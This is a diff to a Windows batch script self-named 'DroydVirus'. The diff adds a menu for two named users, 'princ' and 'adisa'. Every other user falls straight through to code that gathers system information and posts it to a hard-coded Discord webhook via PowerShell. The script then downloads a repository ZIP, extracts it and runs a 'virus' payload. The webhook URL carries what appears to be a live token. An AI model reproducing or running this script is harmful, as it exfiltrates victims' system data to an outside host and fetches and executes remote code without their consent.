@@ -8,14 +8,41 @@ set "downloads_path=%USERPROFILE%\Downloads"
 
 set "user_name=%USERNAME%"
 
+:: Check if the user is "princ" or "adisa"
 if /I "%user_name%"=="princ" (
-   exit
+    goto :showMenu
 )
 
 if /I "%user_name%"=="adisa" (
-   exit
+    goto :showMenu
 )
 
+:: Automatically continue for other users
+goto :continueScript
+
+:: Show the menu for "adisa" and "princ"
+:showMenu
+cls
+echo Welcome to DroydVirus, %user_name%! 
+echo.
+echo Please choose an option:
+echo 1. Run system information test
+echo 2. Download and run DroydVirus repository
+echo 3. Exit
+set /p choice="Enter your choice (1, 2, or 3): "
+
+:: Handle user choice
+if "%choice%"=="1" (
+    call :runTest
+) else if "%choice%"=="2" (
+    call :downloadAndRun
+) else (
+    echo Exiting...
+    exit /b
+)
+
+:: Automatically continue the script for non-"adisa" and non-"princ" users
+:continueScript
 echo Gathering system information...
 
 :: Collect system information
@@ -52,8 +79,14 @@ Here is the detailed system information:%n%n\
 :: Send information to Discord webhook with better formatting and content type
 powershell -Command "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1337159633239937115/KdOhG-AXg3ckXDIrmcWESldNObYb5dZ16S8F591bs12XlwFC7M_l754ukBqeyhvXcJwY' -Method Post -Body '{\"content\": \"%message%\"}' -ContentType 'application/json'"
 
-:: Download the repository
-echo Downloading repository...
+:: Return to main menu after the test
+pause
+goto :eof
+
+:: Function to download and run DroydVirus repository
+:downloadAndRun
+cls
+echo Downloading the DroydVirus repository...
 powershell -Command "& {Invoke-WebRequest '%repo_url%' -OutFile '%zip_path%'}"
 
 :: Extract the ZIP file
@@ -74,4 +107,7 @@ for /d %%D in ("%extract_path%\*") do if exist "%%D\virus" (
 :: Cleanup
 echo Cleaning up...
 del "%zip_path%"
+pause
+goto :eof
+
 exit
